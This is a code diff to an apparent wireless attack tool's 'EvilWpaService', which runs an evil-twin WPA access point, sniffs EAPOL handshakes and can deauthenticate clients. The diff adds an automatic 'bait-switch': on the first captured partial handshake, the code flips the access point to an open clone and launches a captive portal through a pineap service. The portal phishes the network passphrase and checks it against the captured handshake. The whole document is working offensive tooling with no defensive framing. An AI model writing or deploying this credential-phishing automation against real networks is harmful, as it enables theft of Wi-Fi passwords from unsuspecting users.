@@ -91,6 +91,9 @@ class EvilWpaService:
         self._deauth_enabled: bool = False
         self._deauth_iface: str | None = None
         self._deauth_bssid: str | None = None
+        # S12.5 captive-portal bait-switch (set on start)
+        self._auto_captive_portal: bool = False
+        self._captive_launched: bool = False
         # Session config (set on start)
         self._iface: str | None = None
         self._channel: int | None = None
@@ -154,6 +157,7 @@ class EvilWpaService:
         deauth_enabled: bool = False,
         deauth_iface: str | None = None,
         deauth_bssid: str | None = None,
+        auto_captive_portal: bool = False,
     ) -> tuple[bool, str]:
         """Bind to ``iface`` (monitor mode), lock to ``channel`` (must
         match hostapd's), start the EAPOL sniffer + periodic
@@ -182,6 +186,9 @@ class EvilWpaService:
             self._deauth_iface   = deauth_iface if self._deauth_enabled else None
             self._deauth_bssid   = (deauth_bssid.lower()
                                     if self._deauth_enabled and deauth_bssid else None)
+            # S12.5 bait-switch: fire once, on the first harvested partial.
+            self._auto_captive_portal = bool(auto_captive_portal)
+            self._captive_launched = False
             self._session_id = uuid.uuid4().hex[:12]
             self._session_dir = self._evil_wpa_dir / f"{self._session_id}"
             self._session_dir.mkdir(parents=True, exist_ok=True)
@@ -567,6 +574,12 @@ class EvilWpaService:
             # dispatch. Best-effort — a handshakes-service hiccup must
             # never break harvesting.
             self._register_with_handshakes(partial, active_pcap, out_22000)
+            # #119 (S12.5): on the FIRST partial, if the operator armed
+            # the bait-switch at start, flip the AP to an Open clone and
+            # arm the captive portal against this handshake.
+            if self._auto_captive_portal and not self._captive_launched:
+                self._captive_launched = True
+                self._launch_captive_portal(partial)
         if new_count:
             log.info("evil_wpa: %d new partial(s) this extract run", new_count)
 
@@ -685,6 +698,30 @@ class EvilWpaService:
         except Exception:
             log.exception("evil_wpa: handshakes registration failed for %s",
                           partial.get("id"))
+
+    def _launch_captive_portal(self, partial: dict[str, Any]) -> None:
+        """Trigger the S12.5 bait-switch via pineap once we have a real
+        partial to verify against. Best-effort — never breaks the
+        sniff/extract loop. Resets the once-flag on failure so a later
+        partial can retry."""
+        try:
+            from app.services.pineap import get_service as get_pineap
+            ok, msgs = get_pineap().launch_captive_portal(
+                partial.get("hash_line"), partial.get("essid") or self._ssid)
+            log.info("evil_wpa: captive-portal bait-switch %s — %s",
+                     "launched" if ok else "skipped", "; ".join(msgs))
+            if not ok:
+                self._captive_launched = False
+            try:
+                from app import socketio
+                socketio.emit("captive:baitswitch",
+                              {"ok": ok, "messages": msgs,
+                               "ssid": partial.get("essid")}, namespace="/")
+            except Exception:
+                pass
+        except Exception:
+            log.exception("evil_wpa: captive-portal launch hook failed")
+            self._captive_launched = False
 
 
 # ---------- Module singleton ----------
